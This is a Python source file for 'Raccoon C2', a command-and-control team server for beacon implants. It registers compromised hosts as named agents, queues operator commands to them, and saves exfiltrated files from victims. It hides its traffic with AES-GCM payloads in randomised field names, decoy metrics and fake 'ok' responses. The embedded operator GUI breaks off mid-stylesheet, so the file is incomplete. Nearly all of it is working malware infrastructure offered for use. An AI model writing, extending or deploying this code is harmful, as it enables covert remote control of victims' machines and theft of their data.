#!/usr/bin/env python3
"""
Raccoon C2 Team Server
Adapted from boku7/venom architecture, protocol-matched to the Raccoon beacon.
AES-256-GCM encrypted comms, catch-all routing for evasive URLs,
embedded operator GUI with TrashPandaPaws aesthetic.

Usage:
  python server.py --port 443 --ssl
  python server.py --port 8443 --key <base64-key>
  python server.py --derive-key "https://c2.example.com/api/v1/beacon:c2.example.com"
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import secrets
import ssl
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, request, jsonify, send_from_directory, Response

logger = logging.getLogger("raccoon.c2.server")

# ── Shared constants (must match beacon.py) ──

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]

AGENT_NAMES = [
    "bandit", "burglar", "prowler", "scavenger", "ringtail",
    "masked", "nocturnal", "sneaky", "whiskers", "dumpster",
    "shadow", "lurker", "thief", "forager", "trickster",
    "rascal", "scamp", "pirate", "raider", "ghost",
]

import random as _rng


def _decoy_fields(n: int) -> dict:
    pool = {
        "cpu_pct": lambda: round(_rng.uniform(2, 90), 1),
        "mem_mb": lambda: _rng.randint(64, 8192),
        "disk_pct": lambda: round(_rng.uniform(10, 95), 1),
        "request_count": lambda: _rng.randint(100, 99999),
        "session_count": lambda: _rng.randint(1, 5000),
        "latency_ms": lambda: _rng.randint(1, 500),
        "cache_hit_pct": lambda: round(_rng.uniform(50, 99.9), 1),
        "thread_count": lambda: _rng.randint(4, 128),
    }
    keys = _rng.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


# ── Crypto (mirrors beacon._encrypt / _decrypt) ──


class ServerCrypto:
    def __init__(self, key: bytes):
        self._key = key
        self._aesgcm = AESGCM(key)

    def encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    def decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = self._aesgcm.decrypt(nonce, ct, None)
        return json.loads(plaintext)

    def unwrap(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self.decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self.decrypt(v)
                except Exception:
                    continue
        return None

    def wrap(self, data: dict) -> dict:
        encrypted = self.encrypt(data)
        field = _rng.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(_rng.randint(3, 7)))
        return dict(sorted(payload.items()))


# ── Data store ──

agents: dict[str, dict] = {}
task_queues: dict[str, list] = {}
results: dict[str, dict] = {}
history: dict[str, list] = {}
_name_counter = 0


def _assign_name() -> str:
    global _name_counter
    name = AGENT_NAMES[_name_counter % len(AGENT_NAMES)]
    idx = _name_counter // len(AGENT_NAMES)
    _name_counter += 1
    return f"raccoon-{name}-{idx}" if idx > 0 else f"raccoon-{name}"


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _save_state(data_dir: Path):
    state = {
        "agents": agents,
        "history": history,
        "name_counter": _name_counter,
    }
    (data_dir / "state.json").write_text(json.dumps(state, indent=2))


def _load_state(data_dir: Path):
    global agents, history, _name_counter
    state_file = data_dir / "state.json"
    if state_file.exists():
        state = json.loads(state_file.read_text())
        agents.update(state.get("agents", {}))
        history.update(state.get("history", {}))
        _name_counter = state.get("name_counter", 0)
        for aid in agents:
            task_queues.setdefault(aid, [])


# ── Flask app ──


def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
               server_config: Optional[dict] = None) -> Flask:
    app = Flask(__name__)
    static_dir = Path(__file__).parent / "static"
    _server_config = server_config or {}

    # ── Operator auth ──

    def check_auth():
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:] == operator_token
        return False

    def require_auth(f):
        from functools import wraps

        @wraps(f)
        def wrapper(*args, **kwargs):
            if not check_auth():
                return jsonify({"error": "unauthorized"}), 401
            return f(*args, **kwargs)

        return wrapper

    # ── Static files ──

    @app.route("/static/<path:filename>")
    def serve_static(filename):
        return send_from_directory(str(static_dir), filename)

    @app.route("/logo.png")
    def serve_logo():
        logo = Path(__file__).parent.parent.parent / "static" / "trashpanda_logo.png"
        if logo.exists():
            return send_from_directory(str(logo.parent), logo.name)
        return "", 404

    # ── Operator GUI ──

    @app.route("/")
    def index():
        return _OPERATOR_HTML.replace("{{TOKEN}}", operator_token)

    # ── Operator API ──

    @app.route("/api/agents", methods=["GET"])
    @require_auth
    def api_agents():
        agent_list = []
        now = time.time()
        for aid, info in agents.items():
            last = info.get("_last_seen_ts", 0)
            interval = info.get("interval", 300)
            if now - last < interval * 2:
                status = "online"
            elif now - last < interval * 5:
                status = "stale"
            else:
                status = "offline"
            agent_list.append({**info, "status": status})
        return jsonify(agent_list)

    @app.route("/api/agents/<agent_id>", methods=["GET"])
    @require_auth
    def api_agent_detail(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        return jsonify(agents[agent_id])

    @app.route("/api/agents/<agent_id>/task", methods=["POST"])
    @require_auth
    def api_create_task(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        data = request.json
        task = {
            "id": str(uuid.uuid4())[:8],
            "cmd": data.get("cmd", ""),
            "args": data.get("args", ""),
            "data": data.get("data", ""),
            "timeout": data.get("timeout", 300),
            "queued": _now(),
            "status": "pending",
        }
        task_queues.setdefault(agent_id, []).append(task)
        history.setdefault(agent_id, []).append({
            "task_id": task["id"],
            "cmd": task["cmd"],
            "args": task["args"],
            "timestamp": task["queued"],
            "status": "pending",
            "output": None,
        })
        return jsonify(task)

    @app.route("/api/agents/<agent_id>/history", methods=["GET"])
    @require_auth
    def api_history(agent_id):
        return jsonify(history.get(agent_id, []))

    @app.route("/api/tasks/<task_id>", methods=["GET"])
    @require_auth
    def api_task_result(task_id):
        if task_id in results:
            return jsonify(results[task_id])
        return jsonify({"status": "pending"})

    # ── Server config API ──

    @app.route("/api/server/config", methods=["GET"])
    @require_auth
    def api_server_config():
        now = time.time()
        online = sum(1 for a in agents.values()
                     if now - a.get("_last_seen_ts", 0) < a.get("interval", 300) * 2)
        key_b64 = base64.b64encode(crypto._key).decode()
        return jsonify({
            "host": _server_config.get("host", "0.0.0.0"),
            "port": _server_config.get("port", 8443),
            "ssl": _server_config.get("ssl", False),
            "cert": _server_config.get("cert", ""),
            "key_type": _server_config.get("key_type", "default"),
            "enc_key": key_b64,
            "operator_token": operator_token,
            "data_dir": str(data_dir),
            "uptime": int(now - _server_config.get("start_time", now)),
            "agents_total": len(agents),
            "agents_online": online,
            "tasks_total": sum(len(h) for h in history.values()),
        })

    @app.route("/api/server/token", methods=["POST"])
    @require_auth
    def api_rotate_token():
        return jsonify({"error": "Token rotation requires server restart"}), 400

    # ── Beacon catch-all (handles any POST path) ──

    @app.route("/", methods=["POST"])
    @app.route("/<path:path>", methods=["POST"])
    def beacon_handler(path=""):
        try:
            body = request.get_json(silent=True)
            if not body:
                return _fake_response()

            payload = crypto.unwrap(body)
            if payload is None:
                return _fake_response()

            action = payload.get("action", "")

            if action == "register":
                return _handle_register(payload, crypto)
            elif action == "beacon":
                return _handle_beacon(payload, crypto)
            elif action == "result":
                return _handle_result(payload, crypto, data_dir)
            else:
                return _fake_response()

        except Exception as e:
            logger.debug("Beacon handler error: %s", e)
            return _fake_response()

    return app


def _fake_response():
    return jsonify({"status": "ok", "version": "2.1.0"}), 200


def _handle_register(payload: dict, crypto: ServerCrypto):
    implant_id = payload.get("id", "")

    for aid, info in agents.items():
        if info.get("id") == implant_id:
            info.update({
                "hostname": payload.get("hostname", ""),
                "os": payload.get("os", ""),
                "arch": payload.get("arch", ""),
                "user": payload.get("user", ""),
                "pid": payload.get("pid", 0),
                "interval": payload.get("interval", 300),
                "local_ips": payload.get("local_ips", []),
                "last_seen": _now(),
                "_last_seen_ts": time.time(),
            })
            resp = crypto.wrap({"success": True, "agent_id": aid})
            logger.info("Agent re-registered: %s (%s)", aid, payload.get("hostname"))
            return jsonify(resp)

    agent_id = _assign_name()
    agents[agent_id] = {
        "id": implant_id,
        "agent_id": agent_id,
        "hostname": payload.get("hostname", ""),
        "os": payload.get("os", ""),
        "arch": payload.get("arch", ""),
        "user": payload.get("user", ""),
        "pid": payload.get("pid", 0),
        "interval": payload.get("interval", 300),
        "local_ips": payload.get("local_ips", []),
        "uptime": payload.get("uptime", 0),
        "registered": _now(),
        "last_seen": _now(),
        "_last_seen_ts": time.time(),
    }
    task_queues[agent_id] = []
    history[agent_id] = []

    logger.info("New agent registered: %s (%s @ %s)",
                agent_id, payload.get("user"), payload.get("hostname"))

    resp = crypto.wrap({"success": True, "agent_id": agent_id})
    return jsonify(resp)


def _handle_beacon(payload: dict, crypto: ServerCrypto):
    agent_id = payload.get("agent_id")
    if not agent_id:
        for aid, info in agents.items():
            if info.get("id") == payload.get("id"):
                agent_id = aid
                break

    if agent_id and agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()
        agents[agent_id]["uptime"] = payload.get("uptime", 0)
        agents[agent_id]["interval"] = payload.get("interval",
                                                    agents[agent_id].get("interval", 300))
        if payload.get("local_ips"):
            agents[agent_id]["local_ips"] = payload["local_ips"]

        queue = task_queues.get(agent_id, [])
        if queue:
            task = queue.pop(0)
            task["status"] = "dispatched"
            task["dispatched"] = _now()
            logger.info("Dispatching task %s (%s) to %s",
                        task["id"], task["cmd"], agent_id)
            resp = crypto.wrap(task)
            return jsonify(resp)

    return jsonify(crypto.wrap({}))


def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
    task_id = payload.get("task_id", "")
    agent_id = payload.get("agent_id", "")
    status = payload.get("status", "unknown")
    output = payload.get("output", "")
    data = payload.get("data")

    results[task_id] = {
        "task_id": task_id,
        "agent_id": agent_id,
        "status": status,
        "output": output,
        "data": data,
        "received": _now(),
    }

    if agent_id in history:
        for entry in history[agent_id]:
            if entry.get("task_id") == task_id:
                entry["status"] = status
                entry["output"] = output
                break

    if agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()

    logger.info("Result from %s task %s: %s (%d bytes)",
                agent_id, task_id, status, len(output))

    _save_state(data_dir)

    if data and data.get("data"):
        dl_dir = data_dir / "downloads" / agent_id
        dl_dir.mkdir(parents=True, exist_ok=True)
        filename = data.get("filename", f"{task_id}.bin")
        (dl_dir / filename).write_bytes(base64.b64decode(data["data"]))
        logger.info("Downloaded file saved: %s/%s", agent_id, filename)

    return jsonify(crypto.wrap({"ack": True}))


# ── Operator HTML (embedded) ──

_OPERATOR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Raccoon C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#070910;--surface:rgba(10,14,22,0.94);--surface2:rgba(15,20,30,0.88);
  --red:#ff1a1a;--red-dim:#991111;--red-glow:rgba(255,26,26,0.4);
  --green:#33ff33;--green-dim:#1a8c1a;--yellow:#ffcc00;--orange:#ff6600;
  --text:#d0d4dc;--text2:#6b7080;--border:rgba(255,26,26,0.15);
  --mono:'Cascadia Code','Fira Code','JetBrains Mono','Courier New',monospace;
  --sans:system-ui,-apple-system,sans-serif;
}
html,body{height:100%;overflow:hidden;font-family:var(--sans);color:var(--text);background:var(--bg)}
body{
  background-image:url('/static/wallpaper.jpg');
  background-size:cover;background-position:center;background-attachment:fixed;
}
body::after{
  content:'';position:fixed;inset:0;
  background:linear-gradient(180deg,rgba(7,9,16,0.35) 0%,rgba(7,9,16,0.55) 100%);
  pointer-events:none;z-index:0;
}
#app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh}

/* Header */
header{
  display:flex;align-items:center;gap:14px;padding:10px 20px;
  background:var(--surface);border-bottom:1px solid var(--border);
  box-shadow:0 2px 20px rgba(255,26,26,0.08);
}
header img{width:38px;height:38px;border-radius:50%;border:2px solid var(--red-dim)}
header h1{font-size:18px;font-weight:700;color:var(--red);text-shadow:0 0 15px var(--red-glow);letter-spacing:0.04em}
header .subtitle{font-size:11px;color:var(--text2);margin-left:4px}
header .spacer{flex:1}
header .status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
header .info{font-size:11px;color:var(--text2)}

/* Layout */
.main{display:flex;flex:1;overflow:hidden}

/* Sidebar */
.sidebar{
  width:260px;min-width:200px;background:var(--surface);
  border-right:1px solid var(--border);display:flex;flex-direction:column;
}
.sidebar h2{
  font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
  color:var(--text2);padding:14px 16px 8px;
}
.agent-list{flex:1;overflow-y:auto;padding:0 8px 8px}
.agent-card{
  padding:10px 12px;margin-bottom:4px;border-radius:6px;cursor:pointer;
  border:1px solid transparent;transition:all 0.15s;
}
.agent-card:hover{background:var(--surface2);border-color:var(--border)}
.agent-card.active{background:rgba(255,26,26,0.08);border-color:var(--red-dim)}
.agent-card .name{font-size:13px;font-weight:600;color:var(--text)}
.agent-card .meta{font-size:11px;color:var(--text2);margin-top:2px}
.agent-card .dot{
  display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px;vertical-align:middle;
}
.dot.online{background:var(--green);box-shadow:0 0 4px var(--green)}
.dot.stale{background:var(--yellow);box-shadow:0 0 4px var(--yellow)}
.dot.offline{background:#555}

/* Content */
.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
.agent-header{
  padding:12px 20px;background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:16px;
}
.agent-header .agent-name{font-size:15px;font-weight:700;color:var(--red)}
.agent-header .tag{
  font-size:10px;padding:2px 8px;border-radius:3px;
  background:rgba(255,26,26,0.1);color:var(--red);border:1px solid var(--red-dim);
}
.agent-header .detail{font-size:12px;color:var(--text2)}

/* Terminal */
.terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:8px 12px}
.terminal-split{flex:1;display:flex;overflow:hidden;gap:0}
.terminal-left{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:200px}
.terminal{
  flex:1;overflow-y:auto;padding:12px 16px;
  background:rgba(0,0,0,0.6);border-radius:8px;border:1px solid var(--border);
  font-family:var(--mono);font-size:13px;line-height:1.6;
}
.terminal::-webkit-scrollbar{width:6px}
.terminal::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}
.t-system{color:var(--text2);font-style:italic}
.t-cmd{color:var(--red)}
.t-cmd::before{content:'❯ ';color:var(--red-dim)}
.t-output{color:var(--green);white-space:pre-wrap;word-break:break-all}
.t-error{color:#ff6666;white-space:pre-wrap}
.t-info{color:var(--yellow)}
.t-pending{color:var(--text2);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}

/* Resizer */
.resizer{
  width:6px;cursor:col-resize;background:transparent;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
  transition:background 0.15s;
}
.resizer:hover,.resizer.active{background:var(--red-dim)}
.resizer::after{
  content:'';width:2px;height:40px;border-radius:1px;
  background:var(--border);transition:background 0.15s;
}
.resizer:hover::after,.resizer.active::after{background:var(--red)}

/* Side panel */
.side-panel{
  width:420px;min-width:200px;max-width:70%;
  display:none;flex-direction:column;overflow:hidden;
}
.side-panel.open{display:flex}
.side-panel-header{
  display:flex;align-items:center;padding:8px 12px;gap:8px;
  background:rgba(0,0,0,0.4);border-bottom:1px solid var(--border);
  border-radius:8px 8px 0 0;
}
.side-panel-header .title{
  font-size:12px;font-weight:600;color:var(--red);text-transform:uppercase;
  letter-spacing:0.06em;flex:1;
}
.side-panel-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;
  font-size:16px;padding:2px 6px;border-radius:3px;
}
.side-panel-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.side-panel-body{
  flex:1;overflow-y:auto;padding:12px 16px;
  background:rgba(0,0,0,0.6);border-radius:0 0 8px 8px;border:1px solid var(--border);
  border-top:none;font-family:var(--mono);font-size:13px;line-height:1.6;
}
.side-panel-body::-webkit-scrollbar{width:6px}
.side-panel-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}

/* Input */
.input-bar{
  display:flex;gap:8px;padding:8px 0;align-items:center;position:relative;
}
.input-bar .prompt{color:var(--red);font-family:var(--mono);font-size:14px;font-weight:700;white-space:nowrap}
.input-bar input{
  flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);
  border-radius:6px;padding:10px 14px;color:var(--text);
  font-family:var(--mono);font-size:13px;outline:none;
}
.input-bar .ghost{
  position:absolute;left:0;top:0;right:0;bottom:0;
  padding:10px 14px;color:var(--text2);opacity:0.4;
  font-family:var(--mono);font-size:13px;pointer-events:none;
  white-space:nowrap;overflow:hidden;
}
.input-bar input:focus{border-color:var(--red-dim);box-shadow:0 0 8px rgba(255,26,26,0.15)}
.input-bar input::placeholder{color:var(--text2)}
.input-bar button{
  padding:10px 18px;background:var(--red-dim);color:#fff;border:none;
  border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;
  font-family:var(--sans);transition:background 0.15s;
}
.input-bar button:hover{background:var(--red)}

/* Autocomplete dropdown */
.ac-dropdown{
  position:absolute;bottom:100%;left:0;right:80px;
  background:var(--surface);border:1px solid var(--border);border-radius:6px;
  max-height:200px;overflow-y:auto;display:none;z-index:10;
  box-shadow:0 -4px 20px rgba(0,0,0,0.5);
}
.ac-dropdown.open{display:block}
.ac-item{
  padding:6px 14px;font-family:var(--mono);font-size:12px;cursor:pointer;
  color:var(--text);transition:background 0.1s;display:flex;align-items:center;gap:8px;
}
.ac-item:hover,.ac-item.selected{background:rgba(255,26,26,0.12);color:var(--red)}
.ac-item .hint{color:var(--text2);font-size:11px;margin-left:auto}

/* Toolbar */
.toolbar{
  display:flex;gap:6px;padding:8px 12px;flex-wrap:wrap;
  background:rgba(0,0,0,0.6);border-radius:8px;border:1px solid var(--border);
}
.toolbar button{
  padding:6px 14px;background:rgba(255,255,255,0.04);color:var(--text);border:1px solid rgba(255,255,255,0.08);
  border-radius:5px;font-size:12px;cursor:pointer;font-family:var(--sans);transition:all 0.15s;
  display:flex;align-items:center;gap:5px;backdrop-filter:blur(4px);
}
.toolbar button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
.toolbar button .ico{font-size:14px}

/* File browser */
.filebrowser{padding:8px 0}
.fb-path{
  display:flex;align-items:center;gap:8px;padding:6px 0;
  font-family:var(--mono);font-size:13px;color:var(--text2);
}
.fb-path button{
  background:var(--surface2);color:var(--text);border:1px solid var(--border);
  border-radius:4px;padding:3px 10px;font-size:12px;cursor:pointer;font-family:var(--mono);
}
.fb-path button:hover{border-color:var(--red-dim);color:var(--red)}
.fb-list{max-height:400px;overflow-y:auto}
.fb-entry{
  display:flex;align-items:center;gap:10px;padding:5px 10px;
  border-radius:4px;cursor:pointer;font-family:var(--mono);font-size:13px;
  transition:background 0.1s;
}
.fb-entry:hover{background:rgba(255,26,26,0.06)}
.fb-entry .ico{width:20px;text-align:center;font-size:15px;flex-shrink:0}
.fb-entry.dir .name{color:var(--red)}
.fb-entry.file .name{color:var(--text)}
.fb-entry .name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fb-entry .size{color:var(--text2);font-size:11px;flex-shrink:0}
.fb-entry .perm{color:var(--text2);font-size:11px;width:80px;flex-shrink:0}
.fb-entry .actions{display:none;gap:4px;flex-shrink:0}
.fb-entry:hover .actions{display:flex}
.fb-entry .actions button{
  background:var(--surface2);color:var(--text2);border:1px solid var(--border);
  border-radius:3px;padding:2px 7px;font-size:11px;cursor:pointer;
  font-family:var(--mono);transition:all 0.1s;white-space:nowrap;
}
.fb-entry .actions button:hover{border-color:var(--red-dim);color:var(--red);background:rgba(255,26,26,0.1)}
.fb-upload-zone{
  border:2px dashed var(--border);border-radius:6px;padding:16px;margin:8px 0;
  text-align:center;color:var(--text2);font-size:12px;cursor:pointer;
  transition:all 0.15s;
}
.fb-upload-zone:hover,.fb-upload-zone.drag-over{
  border-color:var(--red-dim);color:var(--red);background:rgba(255,26,26,0.05);
}

/* Empty state */
.empty{flex:1}

/* Toast container */
.toast-container{
  position:fixed;top:54px;right:16px;z-index:100;
  display:flex;flex-direction:column;gap:8px;pointer-events:none;
  max-width:380px;
}
.toast{
  pointer-events:auto;
  display:flex;align-items:flex-start;gap:10px;
  padding:12px 16px;border-radius:8px;
  background:var(--surface);border:1px solid var(--border);
  box-shadow:0 4px 24px rgba(0,0,0,0.5);
  font-size:12px;color:var(--text);
  animation:toast-in 0.3s ease-out;
  transition:opacity 0.3s,transform 0.3s;
}
.toast.fade-out{opacity:0;transform:translateX(40px)}
.toast .t-icon{font-size:18px;flex-shrink:0;line-height:1}
.toast .t-body{flex:1;min-width:0}
.toast .t-title{font-weight:700;font-size:12px;margin-bottom:2px}
.toast .t-msg{color:var(--text2);font-size:11px;word-break:break-word}
.toast.t-success{border-color:var(--green-dim)}
.toast.t-success .t-title{color:var(--green)}
.toast.t-warning{border-color:var(--orange)}
.toast.t-warning .t-title{color:var(--orange)}
.toast.t-error{border-color:#cc3333}
.toast.t-error .t-title{color:#ff6666}
.toast.t-info{border-color:var(--red-dim)}
.toast.t-info .t-title{color:var(--red)}
@keyframes toast-in{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}

/* Notification bell */
.bell-wrap{position:relative;margin-left:8px}
.bell-btn{
  background:none;border:none;cursor:pointer;font-size:18px;
  color:var(--text2);transition:color 0.15s;padding:4px;position:relative;
}
.bell-btn:hover{color:var(--text)}
.bell-badge{
  position:absolute;top:0;right:0;min-width:15px;height:15px;
  background:var(--red);color:#fff;font-size:9px;font-weight:700;
  border-radius:8px;display:flex;align-items:center;justify-content:center;
  padding:0 4px;pointer-events:none;
}
.bell-badge:empty,.bell-badge[data-count="0"]{display:none}
.notif-panel{
  position:absolute;top:calc(100% + 8px);right:0;width:360px;max-height:480px;
  background:var(--surface);border:1px solid var(--border);border-radius:8px;
  box-shadow:0 8px 32px rgba(0,0,0,0.6);display:none;z-index:200;
  flex-direction:column;overflow:hidden;
}
.notif-panel.open{display:flex}
.notif-header{
  display:flex;align-items:center;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.notif-header span{flex:1;font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.05em}
.notif-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:11px;
  padding:3px 8px;border-radius:4px;
}
.notif-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.notif-list{flex:1;overflow-y:auto;padding:4px 0}
.notif-list::-webkit-scrollbar{width:4px}
.notif-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
.notif-item{
  display:flex;gap:10px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.03);
  transition:background 0.1s;
}
.notif-item:hover{background:rgba(255,26,26,0.04)}
.notif-item.unread{background:rgba(255,26,26,0.06)}
.notif-item .ni-icon{font-size:16px;flex-shrink:0;margin-top:1px}
.notif-item .ni-body{flex:1;min-width:0}
.notif-item .ni-title{font-size:12px;font-weight:600;color:var(--text)}
.notif-item .ni-msg{font-size:11px;color:var(--text2);margin-top:1px;word-break:break-word}
.notif-item .ni-time{font-size:10px;color:var(--text2);flex-shrink:0;margin-top:1px}
.notif-item.t-success .ni-title{color:var(--green)}
.notif-item.t-warning .ni-title{color:var(--orange)}
.notif-item.t-error .ni-title{color:#ff6666}
.notif-item.t-info .ni-title{color:var(--red)}
.notif-empty{padding:30px;text-align:center;color:var(--text2);font-size:12px}

/* Settings gear */
.gear-wrap{position:relative;margin-left:4px}
.gear-btn{
  background:none;border:none;cursor:pointer;font-size:17px;
  color:var(--text2);transition:color 0.15s,transform 0.3s;padding:4px;
}
.gear-btn:hover{color:var(--text);transform:rotate(45deg)}
.settings-panel{
  position:absolute;top:calc(100% + 8px);right:0;width:400px;
  background:var(--surface);border:1px solid var(--border);border-radius:8px;
  box-shadow:0 8px 32px rgba(0,0,0,0.6);display:none;z-index:200;
  flex-direction:column;overflow:hidden;
}
.settings-panel.open{display:flex}
.settings-header{
  display:flex;align-items:center;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.settings-header span{flex:1;font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.05em}
.settings-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:14px;
  padding:3px 8px;border-radius:4px;
}
.settings-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.settings-body{padding:12px 14px;overflow-y:auto;max-height:480px}
.settings-body::-webkit-scrollbar{width:4px}
.settings-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
.cfg-section{margin-bottom:16px}
.cfg-section-title{
  font-size:11px;font-weight:700;color:var(--red);text-transform:uppercase;
  letter-spacing:0.06em;margin-bottom:8px;padding-bottom:4px;
  border-bottom:1px solid var(--border);
}
.cfg-row{
  display:flex;align-items:center;padding:5px 0;gap:10px;font-size:12px;
}
.cfg-row .cfg-label{color:var(--text2);width:100px;flex-shrink:0;text-align:right}
.cfg-row .cfg-value{color:var(--text);font-family:var(--mono);font-size:12px;word-break:break-all;flex:1}
.cfg-row .cfg-value.warn{color:var(--orange)}
.cfg-row .cfg-value.ok{color:var(--green)}
.cfg-row .cfg-value.secure{color:var(--green)}
.cfg-copy{
  background:none;border:1px solid var(--border);color:var(--text2);
  border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;
  font-family:var(--mono);transition:all 0.15s;margin-left:4px;flex-shrink:0;
}
.cfg-copy:hover{border-color:var(--red-dim);color:var(--red)}
.cfg-uptime{
  display:inline-block;padding:2px 8px;background:rgba(51,255,51,0.08);
  border:1px solid var(--green-dim);border-radius:4px;color:var(--green);
  font-family:var(--mono);font-size:11px;
}
.cfg-stat{
  display:inline-flex;align-items:center;gap:6px;padding:6px 12px;
  background:rgba(255,255,255,0.03);border:1px solid var(--border);
  border-radius:6px;font-family:var(--mono);font-size:13px;
}
.cfg-stat .num{font-weight:700;font-size:16px}
.cfg-stats-row{display:flex;gap:10px;margin-top:8px;flex-wrap:wrap}

/* Pivot map */
.pivot-canvas{width:100%;height:100%;display:block;cursor:grab}
.pivot-canvas:active{cursor:grabbing}
.pivot-controls{
  display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;
}
.pivot-controls button{
  padding:5px 12px;background:rgba(255,255,255,0.04);color:var(--text);border:1px solid var(--border);
  border-radius:4px;font-size:11px;cursor:pointer;font-family:var(--sans);transition:all 0.15s;
}
.pivot-controls button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
.pivot-legend{
  display:flex;gap:14px;padding:6px 0;font-size:11px;color:var(--text2);flex-wrap:wrap;
}
.pivot-legend span{display:flex;align-items:center;gap:4px}
.pivot-legend .dot{width:10px;height:10px;border-radius:50%;display:inline-block}
.pivot-tooltip{
  position:absolute;z-index:300;
  background:rgba(8,12,20,0.95);border:1px solid rgba(85,136,204,0.4);
  border-radius:8px;padding:0;min-width:260px;max-width:360px;
  box-shadow:0 8px 32px rgba(0,0,0,0.7),0 0 20px rgba(85,136,204,0.1);
  font-family:var(--mono);font-size:12px;color:var(--text);
  pointer-events:auto;animation:tooltip-in 0.15s ease-out;overflow:hidden;
}
@keyframes tooltip-in{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
.pivot-tooltip .tt-header{
  display:flex;align-items:center;gap:8px;padding:10px 14px;
  background:rgba(85,136,204,0.08);border-bottom:1px solid rgba(85,136,204,0.15);
}
.pivot-tooltip .tt-header .tt-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.pivot-tooltip .tt-header .tt-title{font-weight:700;font-size:13px;flex:1;color:#fff}
.pivot-tooltip .tt-header .tt-close{
  background:none;border:none;color:var(--text2);cursor:pointer;font-size:14px;padding:2px 4px;
}
.pivot-tooltip .tt-header .tt-close:hover{color:var(--red)}
.pivot-tooltip .tt-body{padding:10px 14px}
.pivot-tooltip .tt-row{display:flex;padding:3px 0;gap:8px}
.pivot-tooltip .tt-lbl{color:var(--text2);width:70px;flex-shrink:0;text-align:right;font-size:11px}
.pivot-tooltip .tt-val{color:var(--text);word-break:break-all;font-size:11px}
.pivot-tooltip .tt-val.highlight{color:var(--green)}
.pivot-tooltip .tt-val.warn{color:var(--orange)}
.pivot-tooltip .tt-section{
  font-size:10px;text-transform:uppercase;letter-spacing:0.06em;
  color:var(--text2);padding:8px 0 3px;border-top:1px solid rgba(255,255,255,0.05);
  margin-top:4px;
}
.pivot-tooltip .tt-ports{display:flex;flex-wrap:wrap;gap:4px;padding:4px 0}
.pivot-tooltip .tt-port{
  padding:2px 7px;background:rgba(85,136,204,0.12);border:1px solid rgba(85,136,204,0.25);
  border-radius:3px;font-size:10px;color:var(--text);
}
.pivot-tooltip .tt-port.critical{border-color:rgba(255,100,100,0.4);background:rgba(255,100,100,0.08);color:#ff8888}
.pivot-tooltip .tt-banner{
  font-size:10px;color:var(--text2);padding:2px 0;word-break:break-all;
}

/* Scrollbar */
.agent-list::-webkit-scrollbar{width:4px}
